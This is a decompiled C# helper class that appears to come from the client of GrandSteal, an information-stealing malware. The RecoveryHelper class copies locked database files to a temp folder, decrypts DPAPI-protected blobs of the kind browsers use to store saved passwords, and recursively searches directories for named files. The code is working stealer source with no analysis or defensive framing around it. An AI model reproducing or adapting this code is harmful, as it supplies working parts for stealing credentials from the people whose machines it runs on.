using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace GrandSteal.Client.Data.Helpers
{
	// Token: 0x02000020 RID: 32
	public static class RecoveryHelper
	{
		// Token: 0x060000AE RID: 174 RVA: 0x000072F4 File Offset: 0x000054F4
		public static string CreateTempCopy(string filePath)
		{
			string text = RecoveryHelper.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00007310 File Offset: 0x00005510
		public static string CreateTempPath()
		{
			return Path.Combine(ConstantStorage.TempDirectory, string.Concat(new object[]
			{
				"tempDataBase",
				DateTime.Now.ToString("O").Replace(':', '_'),
				Thread.CurrentThread.GetHashCode(),
				Thread.CurrentThread.ManagedThreadId
			}));
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x0000240C File Offset: 0x0000060C
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return RecoveryHelper.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x0000737C File Offset: 0x0000557C
		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			string result;
			try
			{
				if (EncryptedData != null && EncryptedData.Length != 0)
				{
					byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
					result = Encoding.UTF8.GetString(bytes);
				}
				else
				{
					result = string.Empty;
				}
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000073E0 File Offset: 0x000055E0
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00007454 File Offset: 0x00005654
		public static string GetMd5Hash(string source)
		{
			HashAlgorithm arg_12_0 = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return RecoveryHelper.GetHexString(arg_12_0.ComputeHash(bytes));
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00007480 File Offset: 0x00005680
		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte expr_14 = bt[i];
				int num = (int)(expr_14 & 15);
				int num2 = expr_14 >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x0000754C File Offset: 0x0000574C
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files != null && files.Length != 0 && level <= maxLevel)
			{
				try
				{
					string[] directories = Directory.GetDirectories(baseDirectory);
					for (int i = 0; i < directories.Length; i++)
					{
						string path = directories[i];
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag = false;
							int num = 0;
							while (num < files2.Length && !flag)
							{
								int num2 = 0;
								while (num2 < files.Length && !flag)
								{
									string arg_69_0 = files[num2];
									FileInfo fileInfo = files2[num];
									if (arg_69_0 == fileInfo.Name)
									{
										flag = true;
										list.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string current in RecoveryHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list.Contains(current))
								{
									list.Add(current);
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				return list;
			}
			return list;
		}
	}
}
